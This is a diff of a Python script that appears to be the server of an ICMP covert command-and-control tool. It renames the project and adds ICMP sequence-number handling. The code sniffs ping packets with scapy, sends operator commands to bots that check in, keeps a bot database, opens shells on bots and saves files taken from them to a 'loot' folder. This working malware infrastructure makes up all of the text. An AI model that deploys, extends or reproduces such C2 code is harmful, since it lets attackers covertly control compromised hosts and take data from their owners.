@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-# pix-s (Ping X-fil Server) ICMP C2 server application
+# pingC2 ICMP C2 server application
 #  written by NoCow
 # This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
 #  and listen for the data payload of "What shall I do master?". If this data is received,
@@ -27,7 +27,7 @@ from scapy.all import *
 
 #printLine method for debugging
 def printLine(line,flag):
-	logfile = file('log/pingc2.log', 'a')
+	logfile = file('log/pix-s.log', 'a')
 	if int(flag) == 2:
 		logfile.write(line + '\n')
 		print line
@@ -143,7 +143,7 @@ def getBotIP(botId):
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
-                     db="pingc2") # name of the data base
+                     db="pixc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
 	cur = db.cursor()
@@ -185,9 +185,9 @@ def catchFile(request, botId):
 	file.close()
 
 # Response function
-def sendPingResponse(dstIP,packetId,icmpId,command):
+def sendPingResponse(dstIP,packetId,icmpId,command,seqId):
 	#printLine("[*] Creating response for using command=%s" %s (str(command)), flag)
-	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=icmpId)/str(command)
+	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=icmpId,seq=seqId)/str(command)
         #resp.show2()
         send(resp)
         printLine("\n[*] Response sent!",flag)
@@ -197,7 +197,7 @@ def displayBots():
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
-                     db="pingc2") # name of the data base
+                     db="pixc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
         cur = db.cursor()
@@ -213,7 +213,7 @@ def updateBotSysinfo(botId,remoteIP,name,os):
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
-                     db="pingc2") # name of the data base
+                     db="pixc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
         cur = db.cursor()
@@ -233,7 +233,7 @@ def doesBotExist(botId):
 		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
-                     db="pingc2") # name of the data base
+                     db="pixc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
         	cur = db.cursor()
@@ -258,7 +258,7 @@ def addBot(srcIP,name,os):
 		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
-                     db="pingc2") # name of the data base
+                     db="pixc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
 		cur = db.cursor()
@@ -280,6 +280,7 @@ def addBot(srcIP,name,os):
 
 def displayMenu():
 	listener = False
+	#os.system('clear')
 	print "\nChoose an option"
 	for proc in active_children():
 		if (proc.name == 'C2Listener'):
@@ -315,7 +316,9 @@ def c2main(command,botShell,botConnect):
                 		request = p['Raw'].load
                         	ip_id = p['IP'].id
                        		icmp_id = p['ICMP'].id
-        		
+				seq_id = p['ICMP'].seq
+        			printLine("[D] p['ICMP'].seq: %s" % p['ICMP'].seq,flag)
+			
 				printLine("[*] Request: " + request, flag)
 				if 'What shall I do master?' in request:
 					printLine("[*] Bot(%s) requesting command" % (request[24:]), flag)
@@ -325,11 +328,11 @@ def c2main(command,botShell,botConnect):
 						printLine("[D] botId = %s and botShell.value = %s" % (botId,botShell.value),flag)
 						if (botId == int(botShell.value)):
 							printLine("[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src),flag)
-							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell')
+							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell',seq_id)
 							botConnect.value = 1
 							return
 						else:
-							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
+							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value,seq_id)
                                                 	printLine("[*] Response sent to %s: %s" % (p['IP'].src,command.value),flag)
 							#print "Option: "
                                         else:
@@ -341,7 +344,7 @@ def c2main(command,botShell,botConnect):
 					checkinInfo = request[8:].split()
                                         botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
 					sendId = "id="+str(botId)
-					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId)
+					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId,seq_id)
 					#resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                         #resp.show2()
                                         #send(resp)
@@ -359,7 +362,7 @@ def c2main(command,botShell,botConnect):
 					else:
 						printLine("[*] Machine does not exist, ignoring",flag)
 	
-					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
+					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id,seq=seq_id)/"Thanks"
                                 	#resp.show2()
                                 	printLine("\n[*] Response sent: Thanks",flag)
                                 	send(resp)
@@ -368,7 +371,7 @@ def c2main(command,botShell,botConnect):
 					if doesBotExist(int(request.split()[1])):
 						printLine("[D] Catching file",flag)
 						catchFile(request,int(request.split()[1]))
-						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks")
+						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks",seq_id)
 					else:
 						printLine("[*] Machine does not exist, ignoring",flag)
 				else:   
@@ -394,7 +397,7 @@ def main(flag):
 	global dbusername
 	global dbpassword
 	
-	conf_file = 'conf/pingc2.conf'
+	conf_file = 'conf/pix-s.conf'
         cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
         cp.readfp(open(conf_file, 'r'))
@@ -429,7 +432,7 @@ def main(flag):
 		#print "[D] Option chosen: ",option
 		if option == '1':
 			command.value = raw_input("Enter command: ")
-			print "[*] Starting listener"
+			#print "[*] Starting listener"
 			if (len(active_children()) > 1):
 				printLine("[*] Capture running. Stopping first.",flag)
 				for proc in active_children():
@@ -474,7 +477,7 @@ def main(flag):
 			printLine( "[*] Bot shell!", flag)
 			displayBots()
 			botNum = raw_input("Bot # for shell: ")
-			print "[*] Starting botshell for #%s" % botNum
+			#print "[*] Starting botshell for #%s" % botNum
 			if botNum == '123456789':
 				botShell.value = '123456789'
 			else:
@@ -531,6 +534,7 @@ def main(flag):
 			return
 		else:
 			printLine("Invalid Option...please try again",flag)
+		#os.system("clear")
 		displayMenu()
 	
 if __name__ == "__main__":
@@ -555,7 +559,7 @@ if __name__ == "__main__":
 		os.makedirs('loot')	
 	
 	printLine("--------------------------------------------",flag)
-	printLine("Pix-s.py started on %s" % (date.today()),flag)
+	printLine("PingC2.py started on %s" % (date.today()),flag)
 	printLine("--------------------------------------------",flag)
 	printLine("[D] flag=%s" % (flag),flag)
 	main(flag)
